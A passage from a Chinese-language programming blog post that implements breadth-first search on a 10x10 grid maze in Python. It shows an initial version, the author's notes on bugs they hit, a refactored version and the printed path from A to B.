<li>第一步：检查边界的长度，如果等于0则说明无解</li>    <li>第二步：从边界中移去一个节点，并将此节点添加到表示已探索的数据结构</li>    <li>第三步：检查被移去的节点，如果此节点包含目标状态，则追踪其父节点，并返回路径</li></ul><p>最后，我们使用一个循环来追踪完整的路径，并将其显示在屏幕上。</p><p>以下是根据思路实现的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">map1  = [[<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the route</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">0</span>]=<span class="string">&#x27;A&#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">9</span>]=<span class="string">&#x27;B&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[<span class="number">5</span>][i] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[i][<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">1</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">2</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">3</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">4</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">6</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">8</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print out the map</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        print(j,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unit</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,c,p</span>):</span></span><br><span class="line">        x=c[<span class="number">0</span>]</span><br><span class="line">        y=c[<span class="number">1</span>]</span><br><span class="line">        self.x=x</span><br><span class="line">        self.y=y</span><br><span class="line">        self.up=(self.x,self.y+<span class="number">1</span>)</span><br><span class="line">        self.down=(self.x,self.y<span class="number">-1</span>)</span><br><span class="line">        self.left=(self.x<span class="number">-1</span>,self.y)</span><br><span class="line">        self.right=(self.x+<span class="number">1</span>,self.y)</span><br><span class="line">        self.directions = [self.up,self.down,self.left,self.right]</span><br><span class="line">        self.parent = p</span><br><span class="line"></span><br><span class="line">start=Unit((<span class="number">9</span>,<span class="number">0</span>),(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">goal=Unit((<span class="number">0</span>,<span class="number">9</span>),(<span class="number">-1</span>,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">travel</span>(<span class="params">map1,start</span>):</span></span><br><span class="line">    frontier = []</span><br><span class="line">    explored = []</span><br><span class="line">    current = Unit((start.x,start.y),start.parent)</span><br><span class="line">    frontier.append(current)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(frontier) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;No result&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">del</span>(frontier[<span class="number">0</span>])</span><br><span class="line">        explored.append(Unit((current.x,current.y),current.parent))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current.x == goal.x <span class="keyword">and</span> current.y == goal.y:</span><br><span class="line">            print(<span class="string">&quot;\nGot it!\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> current.parent != (<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">                <span class="keyword">for</span> trace <span class="keyword">in</span> explored:</span><br><span class="line">                    <span class="keyword">if</span> trace.x == current.parent[<span class="number">0</span>] <span class="keyword">and</span> trace.y == current.parent[<span class="number">1</span>]:</span><br><span class="line">                        <span class="keyword">if</span> map1[current.x][current.y] == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                            map1[current.x][current.y] = <span class="string">&#x27;.&#x27;</span></span><br><span class="line">                        <span class="comment"># print(current.x,current.y)</span></span><br><span class="line">                        current = trace</span><br><span class="line">                        </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> map1:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                    print(j,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> current.directions:</span><br><span class="line">            j=Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y))</span><br><span class="line">            <span class="comment"># print((j.x,j.y),end=&#x27;,&#x27;)</span></span><br><span class="line">            condition = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> explored:</span><br><span class="line">                <span class="keyword">if</span> x.x==j.x <span class="keyword">and</span> x.y==j.y:</span><br><span class="line">                    condition = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> condition <span class="keyword">and</span> j.x&gt;=<span class="number">0</span> <span class="keyword">and</span> j.x&lt;=<span class="number">9</span> <span class="keyword">and</span> j.y&gt;=<span class="number">0</span> <span class="keyword">and</span> j.y&lt;=<span class="number">9</span> <span class="keyword">and</span> map1[j.x][j.y] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">                frontier.append(Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y)))</span><br><span class="line">        current = frontier[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">travel(map1,start)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在实现的过程中，我遇到了一些问题：</p><ul>    <li>由于对Python中类的使用不熟练，导致代码中有关部分看起来很奇怪</li>    <li>在遍历当前节点周围的有效节点时，没有重新初始化节点，而是直接将当前节点周围有效节点的坐标加入边界，导致循环从第二次开始就无法进行，因为坐标没有“周围的有效节点”这个属性</li>    <li>在将以探索过的节点加入对应数据结构后，检查下一个节点是否在此数据结构时直接使用“==”，但是即使坐标相同的两个节点也可能不相等，原因是这两个节点存在于不同的地址，正确的做法是再遍历一遍存储以探索过的数据结构，直接比较此数据结构中节点的坐标值</li></ul><p>在完成初步的实现后，处于对代码重构的要求，对代码做了相关的函数封装：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">map1  = [[<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the route</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">0</span>]=<span class="string">&#x27;A&#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">9</span>]=<span class="string">&#x27;B&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[<span class="number">5</span>][i] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[i][<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">1</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">2</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">3</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">4</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">6</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">8</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print out the map</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">map_show</span>(<span class="params">map1</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> map1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            print(j,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">map_show(map1)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unit</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,c,p</span>):</span></span><br><span class="line">        x=c[<span class="number">0</span>]</span><br><span class="line">        y=c[<span class="number">1</span>]</span><br><span class="line">        self.x=x</span><br><span class="line">        self.y=y</span><br><span class="line">        self.up=(self.x,self.y+<span class="number">1</span>)</span><br><span class="line">        self.down=(self.x,self.y<span class="number">-1</span>)</span><br><span class="line">        self.left=(self.x<span class="number">-1</span>,self.y)</span><br><span class="line">        self.right=(self.x+<span class="number">1</span>,self.y)</span><br><span class="line">        self.directions = [self.up,self.down,self.left,self.right]</span><br><span class="line">        self.parent = p</span><br><span class="line"></span><br><span class="line">start=Unit((<span class="number">9</span>,<span class="number">0</span>),(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">goal=Unit((<span class="number">0</span>,<span class="number">9</span>),(<span class="number">-1</span>,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">route_trace</span>(<span class="params">current,explored</span>):</span></span><br><span class="line">    <span class="keyword">while</span> current.parent != (<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">for</span> trace <span class="keyword">in</span> explored:</span><br><span class="line">            <span class="keyword">if</span> trace.x == current.parent[<span class="number">0</span>] <span class="keyword">and</span> trace.y == current.parent[<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">if</span> map1[current.x][current.y] == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                    map1[current.x][current.y] = <span class="string">&#x27;.&#x27;</span></span><br><span class="line">                <span class="comment"># print(current.x,current.y)</span></span><br><span class="line">                current = trace</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">frontier,explored,current</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> current.directions:</span><br><span class="line">        j=Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y))</span><br><span class="line">        <span class="comment"># print((j.x,j.y),end=&#x27;,&#x27;)</span></span><br><span class="line">        condition = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> explored:</span><br><span class="line">            <span class="keyword">if</span> x.x==j.x <span class="keyword">and</span> x.y==j.y:</span><br><span class="line">                condition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> condition <span class="keyword">and</span> j.x&gt;=<span class="number">0</span> <span class="keyword">and</span> j.x&lt;=<span class="number">9</span> <span class="keyword">and</span> j.y&gt;=<span class="number">0</span> <span class="keyword">and</span> j.y&lt;=<span class="number">9</span> <span class="keyword">and</span> map1[j.x][j.y] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            frontier.append(Unit((i[<span class="number">0</span>],i[<span class="number">1</span>]),(current.x,current.y)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">travel</span>(<span class="params">map1,start</span>):</span></span><br><span class="line">    frontier = []</span><br><span class="line">    explored = []</span><br><span class="line">    current = Unit((start.x,start.y),start.parent)</span><br><span class="line">    frontier.append(current)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(frontier) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;No result&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">del</span>(frontier[<span class="number">0</span>])</span><br><span class="line">        explored.append(Unit((current.x,current.y),current.parent))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current.x == goal.x <span class="keyword">and</span> current.y == goal.y:</span><br><span class="line">            print(<span class="string">&quot;\nGot it!\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            route_trace(current,explored)</span><br><span class="line">            map_show(map1)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        action(frontier,explored,current)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(frontier) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;No result&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        current = frontier[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">travel(map1,start)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # #         B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">A           <span class="comment"># # # # </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Got it!</span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . . . . B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line">          .         </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # # . # # # # </span></span><br><span class="line"></span><br><span class="line">A . . . . . <span class="comment"># # # # 